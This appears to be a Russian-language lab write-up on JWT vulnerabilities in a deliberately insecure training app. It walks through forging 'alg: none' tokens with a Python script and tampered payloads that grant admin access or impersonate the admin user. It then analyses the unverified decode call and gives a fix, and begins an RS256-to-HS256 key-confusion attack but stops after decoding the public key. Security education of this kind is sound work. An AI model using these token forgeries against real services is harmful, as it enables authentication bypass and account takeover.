# Тут писать свой ресерч

# Уязвимости

1. Неподписанный JSON запрос (Поддерживается отправка запроса без подписи. Это позволяет менять содержимое payload)
2. Изменение алгоритма подписи с RS256 на HS256
3. Возможность сбрутить secret key 
 

# Unverified token problem

JWT токен состоит из 3 частей: Header, Payload, Signature. Signature - это подпись, которая вычисляется на основании Header и Payload и зависит от выбранного алгоритма.

В качестве алгоритма подписи поддерживается None (отсутсвие подписи). Соответственно, это позволяет менять содержимое токена без каких либо последствий.

## Эксплуатация

### Шаг 1

Сначала необходимо получить JWT токен. Для этого необходимо залогиниться на http://jwt_insecure.lab/login (user:pass).

В session cookie сервер передает JWT токен, пример: 
```
session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc;
```
JWT токен:
- Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
- Payload: eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9
- Signature: r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc

Для наглядности идем [сюда](https://jwt.io/) и декодируем Header и Payload из JWT токена. Результат:

- Header
```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```
- Payload
```json
{
  "username": "user",
  "is_admin": false
}
```

### Шаг 2
 
Меняем в Header алгоритм подписи на none:
```json
{
  "typ": "JWT",
  "alg": "none"
}
```

### Шаг 3
 
Генерируем новый JWT токен, у которого третья часть (Signature) пустая. Для этого можно использовать следующий код для Python 3

```python
import base64

def b64urlencode(data):
    return base64.b64encode(data.encode('ascii')).decode('ascii').replace('+', '-').replace('/', '_').replace('=', '')

print("%s.%s." % (
        b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}"), # Header with none
        b64urlencode("{\"username\":\"user\",\"is_admin\":false}"), # Payload
    )
)
```

Полученный JWT токен: 
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.
```

### Шаг 4

Заходим на http://jwt_insecure.lab/index_1 и меняем в заголовке запроса значение session cookie на сгенерированный токен.

Исходный запрос

![](img/utp_1.png)

Запрос после изменения токена

![](img/utp_2.png)

Ответ от сервера

![](img/utp_3.png)

Если посмотреть внимательно на Payload

```json
{
  "username": "user",
  "is_admin": false
}
```

можно заметить, что передается два поля: username и is_admin. Первое - имя пользователя, второе - булевый флаг является ли username админом.
Это позволяет:
1. Сделать любого пользователя админом,
2. Залогиниться под любым пользователем.

Пример:

 ```json
{
  "username": "user",
  "is_admin": true
}
```

![](img/utp_4.png)


```json
{
  "username": "admin",
  "is_admin": true
}
```

![](img/utp_5.png)


## Fix

При преходе по адресу http://jwt_insecure.lab/index_1 управление передается в jwt_insecure/app/main.py в функцию index_1

```python
@app.route("/index_1", methods=['GET']) 
def index_1():
	session = request.cookies.get('session')
	isLoggedIn = False

	if session is not None:
		try:
			result = jwt.decode(session, key=jwt_secret, verify=False)
			isLoggedIn = True

		except Exception as err:
			result = str(err)

	else:
		result = ''

	return render_template('index_login.html', isLoggedIn=isLoggedIn, result=result)
```

Как это работает?

Посмотрим на функцию decode из pyjwt/jwt/api_jwt.py

```python
    def decode(self, jwt, key='', verify=True, algorithms=None, options=None, **kwargs):
        # ...
        if options is None:
            options = {'verify_signature': verify}
        else:
            options.setdefault('verify_signature', verify)
            
        decoded = super(PyJWT, self).decode(
            jwt,  # значение session
            key=key,  # jwt_secret
            algorithms=algorithms,  # None
            options=options,  # {'verify_signature': False}
            **kwargs
        )
        # ...
```

Внутри этой функции вызывается decode из pyjwt/jwt/api_jws.py

```python
    # pyjwt/jwt/api_jws.py
    def decode(self, jwt, key='', verify=True, algorithms=None, options=None, **kwargs):
        # ...
        if not verify:
            # ...
        # значение verify_signature расположено в options['verify_signature'] 
        elif verify_signature:
            # верификация подписи
            self._verify_signature(payload, signing_input, header, signature, key, algorithms)
        # ...
```

В decode происходит вызов функции, в которой проверяется JWT подпись. 
Если verify_signature равен False, то проверка подписи не производится.
В результате, для того чтобы исправит данную уязвимость необходимо в jwt_insecure/app/main.py при вызове 
jwt.decode передать параметр verify со значением True

```python
result = jwt.decode(session, key=jwt_secret, verify=True)
# или
result = jwt.decode(session, key=jwt_secret)

```


# Изменение алгоритма подписи с RS256 на HS256 

Алгоритм HS256 использует secret key, чтобы подписать и проверить каждой сообщение. Алгоритм RS256 испльзует private key для подписи и public key для авторизации.

Если изменить RS256 на HS256, сервер будет использовать public key в качестве secret key, а затем использовать HS256 для верификации сигнатуры. 

Так как иногда можно получить public key, можно изменить  алгоритм в header на HS256 и затем подписать public ключом алгоритмом RSA. 

Сервер проверит RSA public key + HS256. 

## Эксплуатация 

### Шаг1 

Идем на /index_2, получаем 

```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FERk44dDdhS1UxbmQ2K1RQYkZFWVJmenIzWApnSE1QZGdzdVZ1c3MrL1UwMjNtRW1vajJ4Zy9lamR0V0UwTWJRUUxkT28rOXlqZmRNbWowYy9NbGYrYXF0M1lPCkNkUWtVV0l1RFZUOVVPTnRBUkFtYWNxQzNQT0xBNXgrcEIyc0ZieWNhT2ZQS2xYV3I2RXZVd2V0TW1PaWNuR1YKeGwrMEIwZDhid1d3TldPV0p3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=
```

Это base64 от ключа. Расшифровываем: https://pastebin.com/16EBZmJf
``` 
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDFN8t7aKU1nd6+TPbFEYRfzr3X
gHMPdgsuVuss+/U023mEmoj2xg/ejdtWE0MbQQLdOo+9yjfdMmj0c/Mlf+aqt3YO
CdQkUWIuDVT9UONtARAmacqC3POLA5x+pB2sFbycaOfPKlXWr6EvUwetMmOicnGV
xl+0B0d8bwWwNWOWJwIDAQAB
-----END PUBLIC KEY-----
```




